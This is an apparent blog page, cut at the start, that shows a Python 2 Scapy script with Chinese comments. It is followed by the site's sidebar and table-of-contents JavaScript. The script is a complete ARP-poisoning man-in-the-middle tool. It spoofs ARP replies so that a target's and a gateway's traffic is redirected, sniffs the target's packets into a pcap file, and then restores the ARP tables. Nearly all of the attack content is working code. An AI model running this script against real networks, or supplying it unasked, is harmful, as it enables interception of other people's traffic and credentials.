</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">interface    = <span class="string">"en1"</span></span><br><span class="line">target_ip    = <span class="string">"172.16.1.71"</span></span><br><span class="line">gateway_ip   = <span class="string">"172.16.1.254"</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line">poisoning    = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span><span class="params">(gateway_ip,gateway_mac,target_ip,target_mac)</span>:</span>	<span class="comment">#恢复正常</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Restoring target..."</span></span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,hwsrc=gateway_mac),count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,hwsrc=target_mac),count=<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(ip_address)</span>:</span>	<span class="comment">#IP转MAC地址 用到srp方法</span></span><br><span class="line">    </span><br><span class="line">    responses,unanswered = srp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)/ARP(pdst=ip_address),timeout=<span class="number">2</span>,retry=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> s,r <span class="keyword">in</span> responses:	<span class="comment">#返回MAC地址</span></span><br><span class="line">        <span class="keyword">return</span> r[Ether].src</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target</span><span class="params">(gateway_ip,gateway_mac,target_ip,target_mac)</span>:</span>	<span class="comment">#投毒函数</span></span><br><span class="line">    <span class="keyword">global</span> poisoning</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#ARP包</span></span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op   = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst= target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op   = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst= gateway_mac</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Beginning the ARP poison. [CTRL-C to stop]"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> poisoning:</span><br><span class="line">        send(poison_target)</span><br><span class="line">        send(poison_gateway)</span><br><span class="line">          </span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">          </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] ARP poison attack finished."</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conf.iface = interface</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭输出</span></span><br><span class="line">conf.verb  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Setting up %s"</span> % interface</span><br><span class="line"></span><br><span class="line">gateway_mac = get_mac(gateway_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gateway_mac <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!!!] Failed to get gateway MAC. Exiting."</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Gateway %s is at %s"</span> % (gateway_ip,gateway_mac)</span><br><span class="line"></span><br><span class="line">target_mac = get_mac(target_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!!!] Failed to get target MAC. Exiting."</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Target %s is at %s"</span> % (target_ip,target_mac)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 启动投毒线程</span></span><br><span class="line">poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))</span><br><span class="line">poison_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Starting sniffer for %d packets"</span> % packet_count</span><br><span class="line">    </span><br><span class="line">    bpf_filter  = <span class="string">"ip host %s"</span> % target_ip</span><br><span class="line">    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Writing packets to arper.pcap"</span></span><br><span class="line">    wrpcap(<span class="string">'arper.pcap'</span>,packets)</span><br><span class="line"></span><br><span class="line">    poisoning = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重置网络</span></span><br><span class="line">    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 0.4 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    var $tocContent = $('.post-toc-content');
    if (isDesktop() && CONFIG.sidebar === 'post') {
      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
        displaySidebar();
      }
    }
  });
</script>
